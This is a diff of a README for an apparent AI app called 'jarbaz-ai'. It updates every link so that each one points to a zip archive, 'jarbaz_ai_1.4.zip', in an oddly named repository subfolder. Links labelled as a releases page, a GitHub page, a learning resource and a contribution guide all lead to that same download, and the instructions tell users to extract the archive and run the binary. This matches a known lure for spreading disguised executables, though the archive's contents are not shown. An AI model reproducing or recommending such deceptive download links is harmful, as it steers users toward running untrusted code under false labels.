@@ -1,7 +1,7 @@
 # 🦜 jarbaz-ai - Unleash the Power of AI Creativity
 
 ## ✅ Download Now!
-[![Download](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz-ai.zip)
+[![Download](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz_ai_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you dive in, make sure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download **Jarbaz AI**, visit the [Releases page](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz-ai.zip). 
+To download **Jarbaz AI**, visit the [Releases page](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz_ai_1.4.zip). 
 
 1. Click on the link above.
 2. Look for the latest release named with the version number (e.g., v1.0.0).
@@ -36,7 +36,7 @@ To download **Jarbaz AI**, visit the [Releases page](https://raw.githubuserconte
 - You can then find it in your Applications list.
 
 ### For Linux Users:
-- Extract the `https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz-ai.zip` file to a location of your choice.
+- Extract the `https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz_ai_1.4.zip` file to a location of your choice.
 - Open a terminal, navigate to the extracted folder, and run the application with the command:
   ```
   ./jarbaz-ai
@@ -81,7 +81,7 @@ Currently, **Jarbaz AI** is designed for desktop platforms only. Mobile compatib
 
 ## ⚠️ Support
 
-If you encounter any issues or have questions beyond the FAQ, feel free to reach out via the **Issues** section on our [GitHub page](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz-ai.zip).
+If you encounter any issues or have questions beyond the FAQ, feel free to reach out via the **Issues** section on our [GitHub page](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz_ai_1.4.zip).
 
 ## 🌟 Feedback
 
@@ -89,7 +89,7 @@ Your feedback is important to us. If you have suggestions or improvements, let u
 
 ## 🔗 Additional Resources
 
-- [Learn More About AI](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz-ai.zip) – Understanding the technology behind Jarbaz AI.
-- [Contribute to the Project](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz-ai.zip) – Find out how you can help improve Jarbaz AI.
+- [Learn More About AI](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz_ai_1.4.zip) – Understanding the technology behind Jarbaz AI.
+- [Contribute to the Project](https://raw.githubusercontent.com/Darkshadow664/jarbaz-ai/main/deteriorationist/jarbaz_ai_1.4.zip) – Find out how you can help improve Jarbaz AI.
 
 Thank you for exploring **Jarbaz AI**. We are excited to see what you create!
